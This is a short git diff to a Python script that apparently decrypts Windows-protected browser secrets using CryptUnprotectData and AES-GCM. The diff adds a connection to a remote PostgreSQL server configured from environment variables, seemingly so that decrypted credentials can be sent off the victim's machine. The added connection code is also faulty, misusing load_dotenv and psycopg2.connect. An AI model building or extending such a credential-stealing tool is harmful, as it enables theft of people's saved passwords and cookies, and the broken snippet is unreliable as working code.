@@ -3,7 +3,8 @@
 import os
 import json
 import base64
-import sqlite3 # Remove this 
+from dotenv import load_dotenv 
+import psycopg2
 from ctypes import *
 from ctypes.wintypes import DWORD
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -14,13 +15,22 @@ CryptUnprotectData = windll.crypt32.CryptUnprotectData
 LocalFree = windll.kernel32.LocalFree
 memcpy = cdll.msvcrt.memcpy
 
-
 class DATA_BLOB(Structure):
     _fields_ = [
         ('cbData', DWORD),
         ('pbData', POINTER(c_char))
     ]
 
+# Load in .env variables to connect to PostgreSQL server 
+host = load_dotenv('host')
+password = load_dotenv('password')
+username = load_dotenv('username')
+port = load_dotenv('port')
+database = load_dotenv('database')
+sslmode = load_dotenv('require')
+
+# Set up cursor 
+cursor = psycopg2.connect(host, database, username, password)
 
 def get_data(blob_out):
     # Source:
